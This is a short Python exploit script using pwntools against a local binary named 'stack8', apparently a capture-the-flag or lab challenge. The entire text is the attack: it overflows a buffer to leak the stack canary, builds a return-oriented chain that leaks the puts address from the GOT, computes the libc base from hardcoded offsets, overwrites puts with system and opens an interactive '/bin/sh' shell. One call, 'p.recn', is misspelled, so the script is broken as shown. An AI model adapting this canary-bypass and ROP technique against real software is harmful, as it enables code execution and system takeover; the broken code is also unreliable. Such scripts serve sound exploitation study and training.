from pwn import *

p = process('./stack8')

read_plt = 0x401080
read_got = 0x404028
puts_plt = 0x401060
puts_got = 0x404018

pop_rdi_ret = 0x401263
pop_rsi_r15_ret = 0x401261
pop_rdx_ret = 0x40117e

payload = b'A' * 0x49
p.send(payload)

p.recn(0x49)
canary = u64(b'\x00' + p.recv(7))
print('canary: ', hex(canary))

payload = b'A' * 0x48
payload += p64(canary)
payload += b'A' * 0x8
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(0x0)
payload += p64(pop_rsi_r15_ret)
payload += p64(puts_got)
payload += p64(0x0)
payload += p64(pop_rdx_ret)
payload += p64(0x10)
payload += p64(read_plt)

p.recvline()
p.send(payload)

puts_libc = u64(p.recvn(6) + b'\x00\x00')
print('puts_libc: ', hex(puts_libc))
libc_base = puts_libc - 0x62420
system_libc = libc_base + 0x30290

payload = p64(system_libc) + b'/bin/sh\x00'
p.send(payload)

p.interactive()